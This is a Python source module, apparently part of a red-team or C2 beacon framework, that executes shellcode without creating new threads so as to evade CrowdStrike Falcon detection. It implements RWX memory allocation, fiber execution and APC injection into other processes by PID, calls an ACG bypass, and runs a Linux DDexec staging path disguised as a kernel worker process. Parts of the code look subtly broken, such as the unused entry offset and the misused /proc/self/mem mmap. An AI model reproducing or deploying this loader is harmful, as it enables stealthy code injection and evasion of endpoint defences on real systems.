"""
Threadless Execution Engine
============================
Cross-platform payload execution without CreateThread / NtCreateThreadEx.

Techniques:
- Windows: CURRENT_THREAD, FIBER, APC (existing thread)
- Linux:   DDEXEC (/proc/self/mem), CURRENT_THREAD (mmap fallback)

Use case:
    Embed Rust reflective loader output into a running beacon process and execute
    it without triggering CrowdStrike Falcon "Suspicious Thread Creation".
"""

import os
import platform
import subprocess
try:
    from ctypes import (
        c_void_p, c_uint32, c_ulong, c_size_t,
        Structure, Union, POINTER, byref, cast, memmove,
    )
    if platform.system() == "Windows":
        from ctypes import windll
    WINDOWS_CTYPES = True
except ImportError:
    WINDOWS_CTYPES = False
    windll = None
from typing import Optional, Any
from dataclasses import dataclass
from enum import Enum

try:
    from cybermodules.dd_executor import DDExecBuilder
    DDEXEC_AVAILABLE = True
except ImportError:
    DDEXEC_AVAILABLE = False

try:
    from evasion.acg_bypass import ACGBypass, is_acg_enabled
    ACG_AVAILABLE = True
except ImportError:
    ACG_AVAILABLE = False
    ACGBypass = None
    is_acg_enabled = None


class ThreadlessTechnique(Enum):
    CURRENT_THREAD = "current_thread"
    FIBER = "fiber"
    APC = "apc"
    DDEXEC = "ddexec"


@dataclass
class ExecutionResult:
    success: bool
    output: Any = None
    error: Optional[str] = None
    technique: Optional[ThreadlessTechnique] = None
    pid: int = 0
    tid: int = 0


class ThreadlessExecutor:
    """
    Execute shellcode / PE images without creating new threads.
    """

    def __init__(self):
        self.system = platform.system()

    def execute(
        self,
        payload: bytes,
        technique: ThreadlessTechnique = ThreadlessTechnique.CURRENT_THREAD,
        **kwargs
    ) -> ExecutionResult:
        if self.system == "Windows":
            return self._windows_execute(payload, technique, **kwargs)
        elif self.system == "Linux":
            return self._linux_execute(payload, technique, **kwargs)
        else:
            return ExecutionResult(False, error=f"Unsupported platform: {self.system}",
                                   technique=technique)

    # =====================================================================
    # Windows
    # =====================================================================
    def _windows_execute(self, payload: bytes, technique: ThreadlessTechnique, **kwargs) -> ExecutionResult:
        if not WINDOWS_CTYPES or windll is None:
            return ExecutionResult(False, error="Windows ctypes not available on this platform",
                                   technique=technique)
        try:
            if ACG_AVAILABLE and kwargs.get("bypass_acg", True):
                acg = ACGBypass()
                acg_result = acg.bypass(method="auto")
                if not acg_result.success:
                    pass

            if technique == ThreadlessTechnique.CURRENT_THREAD:
                return self._win_current_thread(payload, **kwargs)
            elif technique == ThreadlessTechnique.FIBER:
                return self._win_fiber(payload, **kwargs)
            elif technique == ThreadlessTechnique.APC:
                return self._win_apc_existing(payload, **kwargs)
            else:
                return ExecutionResult(False, error="Unsupported Windows technique", technique=technique)
        except Exception as exc:
            return ExecutionResult(False, error=str(exc), technique=technique)

    def _win_current_thread(self, payload: bytes, entry_offset: int = 0, **kwargs) -> ExecutionResult:
        kernel32 = windll.kernel32

        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40

        addr = kernel32.VirtualAlloc(None, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not addr:
            return ExecutionResult(False, error="VirtualAlloc failed",
                                   technique=ThreadlessTechnique.CURRENT_THREAD)

        try:
            memmove(addr, payload, len(payload))
            kernel32.VirtualLock(addr, len(payload))

            entry = addr + entry_offset
            kernel32.FlushInstructionCache(0, addr, len(payload))

            func = cast(addr, c_void_p)
            func()

            return ExecutionResult(True, pid=os.getpid(), tid=kernel32.GetCurrentThreadId(),
                                   technique=ThreadlessTechnique.CURRENT_THREAD)
        finally:
            try:
                kernel32.VirtualUnlock(addr, len(payload))
            except Exception:
                pass

    def _win_fiber(self, payload: bytes, **kwargs) -> ExecutionResult:
        kernel32 = windll.kernel32

        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40

        addr = kernel32.VirtualAlloc(None, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not addr:
            return ExecutionResult(False, error="VirtualAlloc failed",
                                   technique=ThreadlessTechnique.FIBER)

        try:
            memmove(addr, payload, len(payload))
            kernel32.FlushInstructionCache(0, addr, len(payload))

            original_fiber = kernel32.ConvertThreadToFiber(None)
            if not original_fiber:
                return ExecutionResult(False, error="ConvertThreadToFiber failed",
                                       technique=ThreadlessTechnique.FIBER)

            payload_fiber = kernel32.CreateFiber(0, addr, None)
            if not payload_fiber:
                return ExecutionResult(False, error="CreateFiber failed",
                                       technique=ThreadlessTechnique.FIBER)

            kernel32.SwitchToFiber(payload_fiber)
            kernel32.DeleteFiber(payload_fiber)

            try:
                kernel32.ConvertFiberToThread()
            except Exception:
                pass

            return ExecutionResult(True, pid=os.getpid(), tid=kernel32.GetCurrentThreadId(),
                                   technique=ThreadlessTechnique.FIBER)
        finally:
            try:
                kernel32.VirtualFree(addr, 0, 0x8000)
            except Exception:
                pass

    def _win_apc_existing(self, payload: bytes, target_pid: Optional[int] = None, **kwargs) -> ExecutionResult:
        kernel32 = windll.kernel32

        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40

        pid = target_pid or os.getpid()
        h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
        if not h_process:
            return ExecutionResult(False, error="OpenProcess failed",
                                   technique=ThreadlessTechnique.APC)

        try:
            addr = kernel32.VirtualAllocEx(h_process, None, len(payload),
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not addr:
                return ExecutionResult(False, error="VirtualAllocEx failed",
                                       technique=ThreadlessTechnique.APC)

            try:
                written = c_size_t(0)
                kernel32.WriteProcessMemory(h_process, addr, payload, len(payload), byref(written))

                tid = kwargs.get("target_tid") or kernel32.GetCurrentThreadId()
                h_thread = kernel32.OpenThread(0x1F03FF, False, tid)
                if not h_thread:
                    return ExecutionResult(False, error="OpenThread failed",
                                           technique=ThreadlessTechnique.APC)

                try:
                    kernel32.QueueUserAPC(addr, h_thread, 0)
                    return ExecutionResult(True, pid=pid, tid=tid,
                                           technique=ThreadlessTechnique.APC)
                finally:
                    kernel32.CloseHandle(h_thread)
            finally:
                kernel32.VirtualFreeEx(h_process, addr, 0, 0x8000)
        finally:
            kernel32.CloseHandle(h_process)

    # =====================================================================
    # Linux
    # =====================================================================
    def _linux_execute(self, payload: bytes, technique: ThreadlessTechnique, **kwargs) -> ExecutionResult:
        if technique == ThreadlessTechnique.DDEXEC:
            return self._linux_ddexec(payload, **kwargs)
        elif technique == ThreadlessTechnique.CURRENT_THREAD:
            return self._linux_mmap_exec(payload)
        else:
            return ExecutionResult(False, error="Unsupported Linux technique", technique=technique)

    def _linux_mmap_exec(self, payload: bytes) -> ExecutionResult:
        """
        Linux fallback: write ELF into current process memory via /proc/self/mem.
        Real production use should go through DDexecBuilder for full ELF staging.
        """
        if not payload:
            return ExecutionResult(False, error="Empty payload",
                                   technique=ThreadlessTechnique.CURRENT_THREAD)

        try:
            import mmap
            with open("/proc/self/mem", "r+b", buffering=0) as mem:
                size = len(payload)
                mm = mmap.mmap(mem.fileno(), size, mmap.MAP_SHARED, mmap.PROT_WRITE)
                try:
                    if len(payload) > size:
                        return ExecutionResult(False, error="Payload exceeds mmap size",
                                               technique=ThreadlessTechnique.CURRENT_THREAD)
                    mm[:len(payload)] = payload
                finally:
                    mm.close()

            return ExecutionResult(True, pid=os.getpid(), tid=0,
                                   technique=ThreadlessTechnique.CURRENT_THREAD)
        except Exception as exc:
            return ExecutionResult(False, error=str(exc),
                                   technique=ThreadlessTechnique.CURRENT_THREAD)

    def _linux_ddexec(self, payload: bytes, **kwargs) -> ExecutionResult:
        if not DDEXEC_AVAILABLE:
            return ExecutionResult(False, error="DDExecBuilder not available",
                                   technique=ThreadlessTechnique.DDEXEC)

        if not payload:
            return ExecutionResult(False, error="Empty payload",
                                   technique=ThreadlessTechnique.DDEXEC)

        try:
            arch = kwargs.get("architecture", "auto")
            seeker = kwargs.get("seeker", "tail")
            compress = kwargs.get("compress", True)
            argv0 = kwargs.get("argv0", "[kworker/0:0]")
            timeout = kwargs.get("timeout", 30)

            builder = DDExecBuilder(architecture=arch, seeker=seeker, compress=compress)
            ddexec_payload = builder.generate_payload(binary_data=payload, argv0=argv0)
            command = ddexec_payload.command

            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                timeout=timeout,
            )

            if result.returncode == 0:
                return ExecutionResult(
                    True,
                    output=result.stdout.decode("utf-8", "replace"),
                    pid=os.getpid(),
                    tid=0,
                    technique=ThreadlessTechnique.DDEXEC,
                )
            else:
                return ExecutionResult(
                    False,
                    error=result.stderr.decode("utf-8", "replace"),
                    technique=ThreadlessTechnique.DDEXEC,
                )
        except Exception as exc:
            return ExecutionResult(False, error=str(exc),
                                   technique=ThreadlessTechnique.DDEXEC)


class EvasiveBeaconThreadless:
    """
    Wrapper that exposes threadless execution to the evasive beacon agent.
    """

    def __init__(self):
        self.executor = ThreadlessExecutor()

    def run_shellcode(
        self,
        shellcode: bytes,
        technique: str = "current_thread",
        **kwargs
    ) -> ExecutionResult:
        """
        Execute shellcode without creating a new thread.

        Args:
            shellcode: Raw shellcode bytes
            technique: One of current_thread, fiber, apc, ddexec
            **kwargs: Extra args for selected technique
        """
        try:
            t = ThreadlessTechnique(technique.lower())
        except ValueError:
            t = ThreadlessTechnique.CURRENT_THREAD

        if t == ThreadlessTechnique.DDEXEC:
            kwargs.setdefault("architecture", "auto")

        return self.executor.execute(shellcode, technique=t, **kwargs)
